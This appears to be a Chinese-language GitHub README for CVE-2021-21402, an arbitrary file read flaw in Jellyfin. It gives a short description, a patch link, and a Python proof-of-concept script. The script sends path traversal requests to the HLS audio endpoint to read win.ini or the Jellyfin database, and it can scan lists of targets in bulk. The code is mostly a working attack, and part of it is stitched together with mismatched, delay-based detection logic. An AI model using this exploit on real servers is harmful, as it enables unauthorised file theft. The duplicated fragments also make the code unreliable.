# CVE-2021-21402
### 漏洞描述
Jellyfin 是一个自由的软件媒体系统，用于控制和管理媒体和流媒体。它是 emby 和 plex 的替代品，通过多个应用程序从专用服务器向终端用户设备提供媒体。
Jellyfin 低于 10.7.1 的版本中，攻击者可以通过构造恶意请求从 Jellyfin 服务器的文件系统中读取任意文件。当以 Windows 做为服务器操作系统时，此问题更加普遍。暴露于公共Internet的服务器可能会受到威胁。
解决建议

#### 目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
https://github.com/jellyfin/jellyfin/commit/0183ef8e89195f420c48d2600bc0b72f6d3a7fd7

## 上传文件为漏洞利用及验证文件

## 文件编写语言：python3
部分代码示例
````
`漏洞名称:CVE-2021-21402 Jellyfin任意文件读取  
功能：单个检测，批量检测                                     
单个检测：python poc.py -u url
批量检测：python poc.py -f 1.txt
+-----------------------------------------------------------------+                                     
''')
    def exp(self, target_url, session):
        payload=input('请输入任意路径,默认请回车(例如：..\..\..\..\..\..\..\Windows\win.ini)：') or '..\..\..\..\..\..\..\Windows\win.ini'
        url = f"{target_url}/Audio/1/hls/{quote(payload)}/stream.mp3/"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        try:
            res = session.get(url=url,
                                headers=headers,
                                verify=False,
                                timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    def poc(self, target_url, session):
        payload='..\data\jellyfin.db'
        url = f"{target_url}/Audio/1/hls/{quote(payload)}/stream.mp3/"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        try:
            res = session.get(url=url,
                                headers=headers,
                                verify=False,
                                timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    def main(self, target_url, file):
        self.title()
        count=0
        if target_url:
            session = requests.session()
            res=self.exp(target_url, session)
            if res.status_code==200 and res.text is not None:
                print(f'文件内容：\n{res.text}')
        if file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')  #取消换行符
                session = requests.session()
                res=self.poc(target_url, session)

````



            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    def main(self, target_url, file):
        self.title()
        count=0
        if target_url:
            session = requests.session()
            res=self.poc(target_url, session)
            if res.elapsed.total_seconds()>6 and res.status_code==200:
                print(f'\033[31m[+] 延时 {res.elapsed.total_seconds()} 响应值为 {res.status_code}，{target_url} 可能存在漏洞\033[0m')
            else:
                print(f'[+] 延时 {res.elapsed.total_seconds()} 响应值为 {res.status_code}，{target_url} 不存在漏洞')
        if file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')  #取消换行符
                session = requests.session()
                res=self.poc(target_url, session)
                try:
                    if res.elapsed.total_seconds()>6 and res.status_code==200:
                        print(f'\033[31m[{count}] 延时 {res.elapsed.total_seconds()} 响应值为 {res.status_code}，{target_url} 可能存在漏洞\033[0m')
                    else:
                        print(f'[{count}] 延时 {res.elapsed.total_seconds()} 响应值为 {res.status_code}，{target_url} 不存在漏洞')
                except Exception as e:
                    print("\033[31m[x] 请求失败 \033[0m", e)
`if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=False,
                        help="目标地址，带上http://")
    parser.add_argument("-f",
                        '--file',
                        type=argparse.FileType('r'),
                        default=False,
                        help="批量检测，带上http://")
    args = parser.parse_args()
    run = poc()
    run.main(args.url, args.file)`

#### 开源共享资源，禁止商用倒卖！！！

本人上传的均为已披露的漏洞（带编号），适用于测试人员对可能存在漏洞的系统或者服务器进行安全评估，不可用于非法用途！

## 您可以选择联系我们
## zc15108962790@163.com


